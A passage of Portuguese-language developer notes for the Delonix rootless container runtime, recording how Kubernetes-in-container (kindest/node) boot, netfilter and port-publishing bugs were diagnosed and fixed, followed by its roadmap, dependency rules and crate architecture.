100% cgroup v2, confirmado via `stat -fc %T /sys/fs/cgroup` → `cgroup2fs`). O crash reproduz-se
de forma idêntica em 3 condições diferentes:

1. `--privileged` sem a label Kind (cai no caminho `--privileged` genérico).
2. `--privileged` + label Kind, sessão rootless sem delegação systemd (motor avisa: "rootless SEM
   delegação de cgroup").
3. O mesmo, mas envolto em `systemd-run --user --scope -p Delegate=yes` (delegação pedida
   explicitamente) — **não muda o resultado**.
4. Mesmo com `command` sobreposto para `sleep infinity` — não isola nada, porque `--entrypoint`
   não existe no CLI hoje: `compose_command` mantém sempre o `ENTRYPOINT` da imagem
   (`/usr/local/bin/entrypoint /sbin/init`) e só a cauda muda, então o script do `kind` corre de
   qualquer forma.

**Causa-raiz não isolada com 100% de confiança** (precisa da próxima sessão): o log mostra
"detected cgroup v1" — misdetecção, já que o host é v2-only — e o script morre logo a seguir,
silenciosamente (sem stack trace; o `Container` também não guarda exit code hoje, gap a
corrigir). Hipótese mais provável: `/sys/fs/cgroup/cgroup.controllers` não está visível/válido
de dentro do mount+userns do nosso container no momento em que o script de deteção do `kind`
corre, levando-o a um caminho de cgroup v1 legado que depois falha contra um kernel só-v2. Para
confirmar: precisa de um `--entrypoint` override no CLI para correr o entrypoint do
`kindest/node` manualmente com `set -x`, ou copiar/editar o script para instrumentação.
**Actualização (sessão -p/paridade)**: `--entrypoint` JÁ EXISTE no CLI (`cmd_run`, semântica
docker, `""` limpa), e a causa-raiz provável foi corrigida no motor (fallback bind do /sys do
host quando montar sysfs novo dá EPERM em `--privileged --net host`, + mountpoint do cgroup2
criado pós-pivot_root — ver commit `dfe7e0b`). Revalidação do boot do `kindest/node` pendente.

**RESOLVIDO — a deteção de cgroup já não é o bloqueio** (sessão -p/paridade, confirmado com
instrumentação real via `--entrypoint /bin/bash` + `set -x`). Com o fix do sysfs (`dfe7e0b`),
dentro do container `--privileged` o `/sys/fs/cgroup` é `cgroup2fs` com TODOS os controladores
(`cpuset cpu io memory hugetlb pids rdma misc dmem`, 41 entradas) — antes estava vazio. O
entrypoint do `kindest/node`, corrido sob `systemd-run --user --scope -p Delegate=yes`, imprime
agora **`INFO: detected cgroup v2`** (era "detected cgroup v1" + morte) e avança muito mais:
userns ✓, mounts shared ✓, cgroup v2 ✓, machine-id ✓, faking DMI "kind" ✓, iptables legacy.
Também se descobriu, pelo caminho, um **deadlock corrigido**: em modo console (`privileged +
detach + log_path`), se o init morre antes de enviar o master do pty e um neto reparentado
segura o socketpair, o `run` pendurava PARA SEMPRE sem log — `recv_fd` ganhou `SO_RCVTIMEO` 10s.

**RESOLVIDO — netfilter já não é o bloqueio** (loop /loop netfilter). Causa isolada: com um netns
PRÓPRIO (owned pelo userns do container, i.e. `CLONE_NEWNET` e NÃO `--net host`), `CAP_NET_ADMIN`
é efectivo e o backend **nft funciona** (`nft add table`, `iptables-nft -L/-A` todos OK). O
backend **legacy NÃO**: lê `/proc/net/ip_tables_names`, um ficheiro `0440` do root do HOST que no
nosso userns aparece com dono não-mapeado (nobody) → EPERM (o próprio host, como não-root, também
não o lê). O `select_iptables()` do entrypoint do Kind conta linhas de `iptables-legacy-save` vs
`iptables-nft-save`; num netns fresco ambos dão 0 e o empate (`legacy >= nft`) cai para legacy —
o caminho partido. **Fix (`seed_kind_nft` em `container_init`, análogo a `mask_slow_node_units`)**:
para um nó Kind (`node_cgroup`), semeia UMA regra `iptables-nft -A INPUT -j ACCEPT` (inócua, ANTES
do `execve`, ainda com CAP_NET_ADMIN) → `iptables-nft-save` reporta ≥1 linha → o Kind escolhe nft.

**ESTADO ACTUAL — o `kindest/node` ARRANCA** (`run --privileged --detach --net none` sob
`systemd-run --user --scope -p Delegate=yes`, com os dois fixes: sysfs `dfe7e0b` + `seed_kind_nft`):
`detected cgroup v2` → `setting iptables to detected mode: nft` → `starting init` → `systemd 252
running in system mode` → `Welcome to Debian GNU/Linux 12` → dezenas de `Reached target`/`Started`
→ cria a `kubelet.slice`. Container fica **Running**. O NO-GO original (systemd+cgroup do node não
arranca) está **fechado**.

**Conectividade LIGADA + netfilter validado end-to-end** (loop netfilter, 2ª iteração). Com
`--net host -p 6443:6443` (netns próprio + slirp4netns — ver `cmd_run`, `new_netns` +
`slirp_attach`) o nó Kind arranca COM rede: `tap0` `10.0.2.100/24`, resolve `registry.k8s.io`
(outbound OK), `detected cgroup v2` → `iptables mode: nft` → systemd (0 unidades falhadas) →
**containerd `active`** (socket `/run/containerd/containerd.sock`). **`kubeadm init phase preflight`
PASSA** (RC=0) sem UM ERRO de netfilter/iptables — avança até ao pull de imagens. Warnings só de:
swap, cgroup `cpuset missing` (lacuna de delegação, ver abaixo), hostname `debuerreotype`. Os
sysctls de bridge estão activos no nó (`bridge-nf-call-iptables=1`, `ip_forward=1`). **Netfilter
está resolvido de ponta a ponta** para a carga real de k8s.

**Bug corrigido pelo caminho — `exec` largava caps em containers `--privileged`**: `runtime::exec`
usava `resolve_cap_keep` incondicionalmente (default KEPT_CAPS, sem CAP_NET_ADMIN), ignorando
`container.privileged` — ao contrário do init (`spawn`, `if privileged { all_caps_mask() }`).
Depurar netfilter por dentro (`nft`/`iptables` via `delonix container exec`) dava "Operation not
permitted" apesar de o init ter as caps. Corrigido: `exec` espelha o init (caps completas + seccomp
unconfined quando privileged). Confirmado: exec CapEff `1ffffffffff`, `nft` via exec OK.

### CLUSTER KUBERNETES REAL A CORRER — `kubeadm init` COMPLETO (2026-07-17)

Um control-plane Kubernetes v1.34 **Ready** sobre o Delonix, rootless, daemonless, **sem Docker**:

```
NAME   STATUS   ROLES           AGE   VERSION            CONTAINER-RUNTIME
kadm   Ready    control-plane   8m    v1.34.0            containerd://2.1.3
etcd / kube-apiserver / kube-controller-manager / kube-scheduler / kube-proxy / kindnet  →  todos 1/1 Running
```

Provas que interessam: o **kube-proxy programa netfilter** no nosso netns rootless (`nft list tables`
→ `table ip filter`, `table ip mangle`, `table ip nat`) e o nó regista-se com `INTERNAL-IP 10.0.2.100`.

**A receita que um nó Kind rootless EXIGE** (o `delonix cluster` tem de a gerar; nada disto é bug do
runtime — é config de kubelet/kube-proxy, e é exactamente o que o `kind` rootless também faz):
1. **`featureGates: { KubeletInUserNamespace: true }`** no `/var/lib/kubelet/config.yaml`. É O passo
   decisivo. Sem ele o kubelet morre em `open /dev/kmsg` — e o próprio kubelet diz a solução no log
   ("running in UserNS, Hint: enable KubeletInUserNamespace feature flag"). Tentar dar-lhe um
   `/dev/kmsg` NÃO resolve: um bind do kmsg do host é `root:adm 0640` (uid mapeado não abre) e um
   symlink para `/dev/console` só troca ENOENT por EIO. Com a gate, o kubelet ignora o kmsg.
2. **`--fail-swap-on=false`** no kubelet: um container herda o `/proc/swaps` do HOST — o fix de swap
   da imagem VM dourada (fstab) não se aplica aqui.
3. **`conntrack: { maxPerCore: 0, min: 0 }`** no ConfigMap do kube-proxy: `nf_conntrack_max` é um
   sysctl global, não escrevível de um userns (`permission denied` → CrashLoopBackOff).
4. CNI: o `/kind/manifests/default-cni.yaml` da imagem (kindnet) aplica-se tal e qual (só substituir
   `{{ .PodSubnet }}`); o nó passa a `Ready` ~1min depois.

**Aprendido pelo caminho (leaks de recursos — ver "Produção/HA")**: o kubelet aplicou a taint
`node.kubernetes.io/disk-pressure` porque **49 rootfs órfãos** (~45 GiB) de spikes anteriores tinham
enchido o disco a 89%. Directórios de container sobrevivem a mortes abruptas sem ninguém os reapar.

**Próximas fatias (já não netfilter)**: (1) cgroup `cpuset` na delegação (preflight marca-o
"missing required" — só WARNING, mas fecha-o para um nó limpo); (2) correr `kubeadm init` completo
até um control-plane Ready (o preflight já passa; falta exercitar o pull+init+CNI reais); (3)
`--net kind` rootless (setns) para nós na MESMA rede em vez de slirp isolado por nó. O shim Docker
continua depois destes, mas a fundação — cgroup + netfilter + systemd + containerd + rede — arranca.


### RESOLVIDO — as portas publicadas morriam sozinhas: era o `delonix-engine`, não o runtime (2026-07-17)

**Fechado.** Este bug queimou várias sessões porque o diagnóstico registado aqui estava ERRADO em
ambas as premissas: dizia que "as duas metades do `publish_port` falham em SILÊNCIO" e mandava
procurar quem chamava `unpublish_port`. Não falham, e não há chamador nenhum.

**Sintoma**: porta publicada serve HTTP 200 e ~10–16s depois dá `000`, com o container `Running` e
sem `stop`/`rm`.

**O que se provou, por medição** (não por leitura de código):
1. O **DNAT fica intacto** (`nft list table ip dlxing` mostra a regra muito depois do `curl` já dar
   `000`). Só o `hostfwd` do slirp desaparece — não são "as duas metades".
2. **Nenhum código deste repo o remove**: instrumentados `unpublish_port`, `slirp_remove_hostfwd`,
   **todos** os comandos não-`list` do `slirp_api` (apanha o `remove_hostfwd` que o
   `reap_orphan_hostfwds` envia directamente) e o `control_send`. Zero ocorrências, sempre.
3. Slirp e holder **não reiniciam** (mesmo pid); o `control_loop` do holder não tem nada periódico.
4. Um hostfwd metido **à mão** pelo api-socket, sem delonix envolvido, **também** desaparece.
5. **Não é bug do slirp4netns**: um slirp de sala limpa, mesmas flags, alvo `unshare -r -n`,
   manteve o hostfwd os 33s todos.

**Causa-raiz, provada com SIGSTOP** (congelar os engines, sem matar nada):
```
engines A CORRER   → hostfwd criado a t=0,00s · DESAPARECE a t=12,01s
engines CONGELADOS → hostfwd criado a t=0,00s · PERSISTE os 30s todos
```
É o **`delonix-engine` (delonix-paas, produto PRIVADO)** a reapar portas que não são dele:
`crates/delonix-api/src/ui.rs:12937` chama `reap_orphan_hostfwds(&live)` com um `live` que só tem os
containers DELE — logo tudo o que a CLI do runtime publica é, para ele, um órfão. Agravante:
`crates/delonix-api/Cargo.toml:15` fixa `delonix-net` na **tag v0.1.0**, a versão ANTIGA do reaper
(a do fail-open: lista vazia ⇒ "nada em uso" ⇒ apaga tudo). Por isso é que remover o chamador AQUI
(`9bbbd11`) não mudou nada: a cópia que corre é a do PaaS.

**A correcção NÃO é neste repo** (regra de isolamento) — é no `delonix-paas`: o engine não pode
reapar hostfwds que não criou, e o pin de `delonix-net` tem de subir. Do lado de cá, o que faz
sentido é defesa em profundidade: **`reap_orphan_hostfwds` é código morto (zero chamadores) e é uma
armadilha para consumidores** — uma função pública que apaga estado partilhado e falha ABERTO com
lista vazia. Apagar, ou pôr a fail-closed.

**Ferramenta que ficou**: `DELONIX_TRACE_UNPUBLISH=<ficheiro|stderr>` regista quem despublica
(função, porta, pid/ppid/exe + backtrace), no `slirp_api`/`control_send`/`unpublish_port`. Custo
zero sem a env var. Foi o que permitiu ILIBAR este repo — sem isto voltava-se a suspeitar do código
errado.

**Continua em aberto**: o `refcount` do ingress vaza (16 com 3 containers vivos).

Ver [docs/RELATORIO-PRE-PRODUCAO.md](docs/RELATORIO-PRE-PRODUCAO.md) para a bateria E2E completa
(139 PASS / 1 FAIL) e a lista de gaps.

## Próximas fases (pedidas, não implementadas — cada uma precisa da sua própria sessão de planeamento)

- **`delonix cluster --name <n> --control-plane <n> --workers <n>`** (sem `kubeadm`) — cluster k8s
  local via `kind` (shell-out à ferramenta já instalada no host). **Bloqueado** pelo NO-GO do
  spike acima — o `kindest/node` não arranca sob o nosso `--privileged` hoje; ver secção "Cluster
  modo Kind sem Docker — investigação". Precisa de instrumentação de arranque antes de continuar.
- **`etcd: external`** em `delonix cluster apply` — cluster etcd dedicado (TLS entre membros,
  discovery) em vez do `stacked` já suportado.
- **Paralelizar a preparação de host** em `cluster apply` (hoje sequencial, deliberado nesta v1).
- **HA multi-control-plane em `delonix cluster kubeadm`** — hoje só provisiona 1 control-plane;
  para vários precisa de provisionar/gerir um endpoint estável (LB/VIP) automaticamente, o que
  ainda não existe. `delonix cluster apply` já suporta HA se o endpoint for externo/manual.
- **`delonixd`** (daemon opcional em userspace) + **dataplane de ingress/egress próprio** (evitar
  um veth por container — hoje `infra::do_attach` cria sempre 1 veth-par por container,
  confirmado) + **firewall dinâmico** para publish de portas + **eBPF** para observabilidade +
  **auto-dimensionamento** no pico. Nenhuma peça disto existe hoje (zero eBPF/autoscaling/daemon
  no repo, confirmado por grep). É uma mudança de filosofia (o produto é daemonless por desenho)
  e um dataplane novo de raiz — meses de trabalho de um crate dedicado, não uma sessão.

## Regra de ouro: fronteira com o PaaS

Este código **não pode depender de nada privado**. Antes de qualquer commit:

1. **Nunca** adicionar uma dependência a `delonix-core`, `delonix-api`, `delonix-orchestrator`,
   ou qualquer outro crate do monorepo `delonix-paas` — este repo tem de compilar sozinho,
   sem acesso a nada privado. `cargo tree -e normal` não deve mostrar nenhum crate `delonix-*`
   que não esteja listado no `Cargo.toml` raiz.
2. **Sem noção de tenant/licença/billing/Console.** Se uma mudança precisar de saber "quem é
   o cliente" ou "que plano tem", essa lógica pertence ao `delonix-paas`, não aqui.
3. **`Secret`/`SecretStore`/`CredVault`** (`delonix-runtime-core::secret`/`cred_vault`) são o
   Secret Manager do runtime (`--secret`/`--secret-files`, Docker-style) — não confundir com
   nenhum cofre de credenciais de plataforma/SSO/DNS que o PaaS privado tenha por cima.
4. **`delonix-net` inclui WireGuard** (`wg.rs`) — cifra o transporte VXLAN entre nós, é SDN
   genuína (fica aqui). O broker de control-plane que decide QUANDO publicar portas
   (`Router`, multi-tenant) ficou no lado privado (`delonix-overlay`, em `delonix-paas`).

## Arquitetura (8 crates)

| Crate | Responsabilidade |
|---|---|
| `delonix-runtime-core` | tipos partilhados: `Container`, `Vm`, `Status` (6 estados), `Store`/`JsonStore`, typestate, deteção de virtualização, Secret Manager |
| `delonix-runtime` / `delonix-runtime-bin` | runtime de containers (clone/namespaces/cgroups, create/stop/exec, reconcile_status) + a CLI `delonix` completa (container/image/build/vm/volumes/network — ver secção "CLI" acima) |
| `delonix-net` | SDN rootless: holder netns + bridge + slirp único, DNAT/firewall nft, compat CNI, overlay WireGuard inter-nó |
| `delonix-image` | imagens OCI: pull/registry/build, buildpacks CNB, registo interno, verificação de assinatura |
| `delonix-vm` | microVMs declarativas — trait `VmBackend` (Cloud Hypervisor ou libvirt) |
| `delonix-volume` | volumes nomeados e bind mounts |
| `delonix-cri` | servidor CRI (`runtime.v1`) — permite ao Delonix servir de runtime a um `kubelet` |

## Histórico

Extraído de `delonix-paas` via `git filter-repo` (histórico real preservado, não squash) —
ver a skill `delonix-paas` no control dir para o produto de origem.
